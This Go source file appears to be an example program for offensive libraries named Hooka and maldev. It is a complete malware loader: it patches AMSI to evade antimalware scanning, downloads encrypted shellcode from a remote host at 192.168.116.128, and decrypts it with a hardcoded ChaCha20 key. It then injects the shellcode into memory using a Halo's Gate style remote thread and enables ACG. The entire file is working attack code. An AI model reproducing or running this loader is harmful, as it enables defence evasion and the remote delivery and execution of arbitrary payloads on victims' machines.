package main

import (
	"fmt"
	"github.com/D3Ext/Hooka/pkg/hooka"
	maldev "github.com/D3Ext/maldev/crypto"
	"log"
)

func main() {
	fmt.Println("[*] Patching amsi...")
	// patch AMSI
	err := hooka.PatchAmsi()
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Retrieving encrypted shellcode...")
	// retrieve encrypted shellcode from remote url
	enc_shellcode, err := hooka.GetShellcodeFromUrl("http://192.168.116.128/shellcode.enc")
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Decrypting shellcode...")
	// decrypt shellcode using Chacha20 algorithm
	shellcode, err := maldev.Chacha20Decrypt(enc_shellcode, []byte("SuperStrongPasswordExample123456"))
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println(shellcode)

	fmt.Println("[*] Injecting shellcode...")
	err = hooka.CreateRemoteThreadHalos(shellcode)
	if err != nil {
		log.Fatal(err)
	}

	fmt.Println("[*] Enabling ACG...")
	// enable ACG (useful if process doesn't exits after this)
	err = hooka.EnableACG()
	if err != nil {
		log.Fatal(err)
	}

}
